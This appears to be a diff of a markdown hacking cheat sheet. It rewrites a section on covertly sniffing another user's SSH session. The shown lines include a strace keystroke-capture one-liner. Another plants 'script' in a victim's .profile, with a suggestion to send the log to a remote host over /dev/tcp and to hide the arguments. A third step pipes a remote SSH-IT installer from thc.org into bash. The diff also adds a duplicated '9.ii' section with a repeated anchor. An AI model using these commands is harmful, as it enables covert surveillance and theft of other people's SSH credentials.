@@ -60,10 +60,12 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [cryptsetup](#crltefs-anchor)
       1. [EncFS](#crencfs-anchor)
    1. [Encrypting a file](#cref-anchor)
+1. [Sniffing a user's SSH session](#misc-anchor)
+   1. [with strace](#sss-anchor)
+   1. [with script](#ssswos-anchor)
+   1. [with a wrapper script](#ssswor-anchor)
+   1. [with SSH-IT](#sshit-anchor)
 1. [Miscellaneous](#misc-anchor)
-   1. [Sniff a user's SSH session](#sss-anchor)
-   1. [Sniff a user's SSH session without strace](#ssswos-anchor)
-   1. [Sniff a user's SSH session without root privileges](#ssswor-anchor)
    1. [How to survive high latency connections](#hlc-anchor)
    1. [Cool Linux commands](#cool-anchor) 
     
@@ -701,14 +703,14 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.
 ---
 <a id="misc-anchor"></a>
 <a id="sss-anchor"></a>
-**9.i. Sniff a user's SSH session**
+**9.i Sniff a user's SSH session with strace**
 ```sh
 strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
 ```
 Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
 
 <a id="ssswos-anchor"></a>
-**9.ii Sniff a user's SSH session without strace**
+**9.ii Sniff a user's SSH session with script**
 
 The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
 ```sh
@@ -717,7 +719,7 @@ echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
 Consider using [zap-args](#hya-anchor) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
 
 <a id="ssswor-anchor"></a>
-**9.iii. Sniff a user's SSH session without root privileges**
+**9.iii. Sniff a user's SSH session with a wrapper script**
 
 Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)
 
@@ -758,8 +760,27 @@ To uninstall cut & paste this\033[0m:\033[1;36m
 
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
+<a id="sshit-anchor"></a>
+**9.iv Sniff a user's SSH session using SSH-IT**
+
+The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).
+
+```sh
+bash -c "$(curl -fsSL ssh-it.thc.org/x)"
+```
+
+<a id="ssswos-anchor"></a>
+**9.ii Sniff a user's SSH session without strace**
+
+The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
+```sh
+echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
+```
+Consider using [zap-args](#hya-anchor) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+
+
 <a id="hlc-anchor"></a>
-**9.iii. How to survive high latency connections**
+**10.i. How to survive high latency connections**
 
 Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...
 
@@ -773,7 +794,7 @@ Example for *SSH*:
 rlwrap ssh user@host
 ```
 <a id="cool-anchor"></a>
-**9.iv. Cool Linux commands**
+**10.ii. Cool Linux commands**
 
 1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
 1. https://github.com/ibraheemdev/modern-unix
